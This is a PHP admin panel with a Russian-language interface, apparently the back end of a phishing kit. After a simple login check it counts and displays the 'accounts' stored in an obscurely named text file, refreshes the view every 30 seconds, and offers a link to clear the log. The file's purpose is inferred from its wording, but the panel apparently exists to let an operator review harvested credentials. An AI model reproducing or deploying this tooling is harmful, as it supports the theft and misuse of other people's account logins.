<?php
error_reporting(0);
include_once('config.php');
session_start();
if(isset($_GET['logout']) and $_GET['logout']=='y'){session_destroy();header('Location: /admin/');}
if(isset($_POST['submit']))	if((!empty($_POST['user'])) and (!empty($_POST['pass'])) and ($_POST['user']==$l) and ($_POST['pass']==$p)){$_SESSION['user'] = $l;header('Location: /admin/');}
$file = file_get_contents('Dc4XzN4dL.txt');
$count = file("Dc4XzN4dL.txt");
?>
<!DOCTYPE html>
<html>
<head>
<title>Админ Панель</title>
<link rel="shortcut icon" href="../fs/favicon.ico">
<meta charset="utf8">
<meta http-equiv="Refresh" content="30" />
<!-- Bootstrap CSS -->
<link href="http://getbootstrap.com/dist/css/bootstrap.min.css" rel="stylesheet">
<!-- JS is loading -->
<script src="https://ajax.googleapis.com/ajax/libs/jquery/1.11.1/jquery.min.js"></script>
<script src="../js/adm_success.js"></script>
</head>
<body style="background-image: url(../img/bg_auth.png)">
	<div class="container" style="padding-top: 100px;">
		<div style="width:700px; margin:auto;" class="well">
		
		<!-- if user is logout-->
		<?php if(!isset($_SESSION['user'])){?> 
		<h1 align="center">Введите данные для входа</h1>
			<form method="POST">
				<div class="form-group">
				  <input type="text" class="form-control" placeholder="Логин" name="user">
				</div>		
				<div class="form-group">
				  <input type="password" class="form-control" placeholder="Пароль" name="pass">
				</div>				
				<div class="form-group">
				  <input type="submit" class="btn btn-primary" value="Войти" style="width:100%" name="submit">
				</div>					
			</form>
		<?php }?>
		
		<!-- if user is entered -->
		<?php if(isset($_SESSION['user']) and $_SESSION['user']==$l){?>
		<h3 align="center"><a href="./index.php?logout=y">Выйти из админки</a> | <a href="clear.php">Очистить лог</a></h3><hr>
		<?php
		echo 'Количество аккаунтов: ', count($count);
		?>
		|
		<?php
		$file_name = "Dc4XzN4dL.txt";
		$size = filesize($file_name);
		echo "Размер файла:", "&nbsp" .$size. "&nbsp". "байт";	
		?>	
<p>
		<div class="form-group">
		  <textarea class="form-control ourAcc" rows="10" cols="50">
		  <?php
			echo $file;
		  	?>
		  </textarea>
		</div>	
		<?php }?>
		</div>
		
	</div>
</body>
</html>